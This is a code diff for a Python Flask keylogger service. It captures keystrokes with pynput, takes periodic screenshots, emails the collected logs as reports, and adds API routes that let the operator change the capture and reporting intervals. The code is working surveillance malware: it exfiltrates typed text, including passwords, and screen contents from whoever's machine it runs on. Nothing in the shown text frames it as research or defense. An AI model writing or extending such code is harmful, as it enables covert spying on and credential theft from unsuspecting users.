@@ -5,14 +5,14 @@ import pyautogui
 import smtplib
 import psycopg2
 import pynput
+import jwt
+import json
+import mimetypes
 from pynput.keyboard import Listener
 from dotenv import load_dotenv
 from flask_cors import CORS
 from email.message import EmailMessage
-import mimetypes
 from flask import Flask, request, jsonify, send_from_directory
-import requests
-import jwt
 
 
 CLERK_JWT_PUBLIC_KEY = os.getenv("CLERK_JWT_PUBLIC_KEY")
@@ -20,6 +20,7 @@ CLERK_API_URL = "https://api.clerk.dev/v1"
 
 
 load_dotenv()
+CONFIG_FILE = "config.json"
 
 app = Flask(__name__)
 CORS(app)
@@ -51,28 +52,73 @@ keylog_listener = None
 LOG_FOLDER = "./logs"
 LOG_FILE = os.path.join(LOG_FOLDER, "keylogs.txt")
 SCREENSHOT_FOLDER = os.path.join(LOG_FOLDER, "screenshots")
-REPORT_INTERVAL = 60
-SCREENSHOT_INTERVAL = 30
 
 
-### **📂 Ensure Required Folders and Files Exist**
+email_interval = 60
+screenshot_interval = 30
+
+
+def load_config():
+    if not os.path.exists(CONFIG_FILE):
+        default_config = {
+            "email_interval": 600,
+            "screenshot_interval": 30,
+            "keylog_interval": 5
+        }
+        with open(CONFIG_FILE, "w") as f:
+            json.dump(default_config, f)
+    with open(CONFIG_FILE, "r") as f:
+        return json.load(f)
+
+
+def save_config(config):
+    with open(CONFIG_FILE, "w") as f:
+        json.dump(config, f, indent=4)
+
+@app.route("/get_settings", methods=["GET"])
+def get_settings():
+    """Return the current settings."""
+    config = load_config()
+    return jsonify(config)
+
+@app.route("/update_settings", methods=["POST"])
+def update_settings():
+    """Update settings based on user input."""
+    try:
+        data = request.json
+        config = load_config()
+
+        if "email_interval" in data:
+            config["email_interval"] = int(data["email_interval"])
+        if "screenshot_interval" in data:
+            config["screenshot_interval"] = int(data["screenshot_interval"])
+        if "keylog_interval" in data:
+            config["keylog_interval"] = int(data["keylog_interval"])
+
+        save_config(config)
+        return jsonify({"message": "Settings updated successfully", "settings": config})
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
+
+
+
 def ensure_directories():
     if not os.path.exists(LOG_FOLDER):
         os.makedirs(LOG_FOLDER)
     if not os.path.exists(SCREENSHOT_FOLDER):
         os.makedirs(SCREENSHOT_FOLDER)
     if not os.path.exists(LOG_FILE):
-        open(LOG_FILE, "w").close()  # Create an empty log file if not exists
+        open(LOG_FILE, "w").close()
 
 
-### **📸 Screenshot Capture**
+
 def capture_screenshot():
     screenshot_path = os.path.join(SCREENSHOT_FOLDER, f"screenshot_{int(time.time())}.png")
     pyautogui.screenshot().save(screenshot_path)
     return screenshot_path
 
 
-### **⌨ Keylogger Function**
 def on_press(key):
     try:
         key_text = key.char if hasattr(key, 'char') else str(key)
@@ -85,7 +131,6 @@ def on_press(key):
         print(f"❌ Keylogger Error: {e}")
 
 
-### **📩 Email Report Function**
 def send_email_report():
     try:
         msg = EmailMessage()
@@ -126,26 +171,30 @@ def get_screenshot(filename):
     return send_from_directory(SCREENSHOT_FOLDER, filename)
 
 
-### **🖥 Background Monitoring Task**
 def monitor_activity():
     global monitoring, keylog_listener
     last_screenshot_time = time.time()
     last_email_time = time.time()
 
-    # Start Keylogger Listener
     with pynput.keyboard.Listener(on_press=on_press) as keylog_listener:
         while monitoring:
-            time.sleep(5)
+            time.sleep(1)  # Check every second
 
-            # Take Screenshots at set intervals
-            if time.time() - last_screenshot_time >= SCREENSHOT_INTERVAL:
+            # Load the latest settings dynamically
+            config = load_config()
+            email_interval = config["email_interval"]
+            screenshot_interval = config["screenshot_interval"]
+
+            # Screenshots at intervals
+            if time.time() - last_screenshot_time >= screenshot_interval:
                 capture_screenshot()
                 last_screenshot_time = time.time()
 
-            # Send Email Reports at set intervals
-            if time.time() - last_email_time >= REPORT_INTERVAL:
+            # Email at intervals
+            if time.time() - last_email_time >= email_interval:
                 send_email_report()
                 last_email_time = time.time()
+
 
 def verify_clerk_token(token):
     try:
@@ -172,7 +221,6 @@ def protected_route():
     return jsonify({"message": "Authenticated", "user": user_data})
 
 
-### **🟢 Start Monitoring API**
 @app.route('/start_monitoring', methods=['POST'])
 def start_monitoring():
     global monitoring, monitoring_thread
@@ -180,7 +228,7 @@ def start_monitoring():
     if monitoring:
         return jsonify({'message': 'Monitoring already running'}), 400
 
-    ensure_directories()  # Ensure folders and files exist before starting
+    ensure_directories()
     monitoring = True
     monitoring_thread = threading.Thread(target=monitor_activity, daemon=True)
     monitoring_thread.start()
@@ -210,7 +258,6 @@ def get_logs():
         return jsonify({"error": str(e)}), 500
 
 
-### **🔴 Stop Monitoring API**
 @app.route('/stop_monitoring', methods=['POST'])
 def stop_monitoring():
     global monitoring
@@ -225,3 +272,4 @@ def stop_monitoring():
 if __name__ == "__main__":
     ensure_directories()
     app.run(debug=True)
+
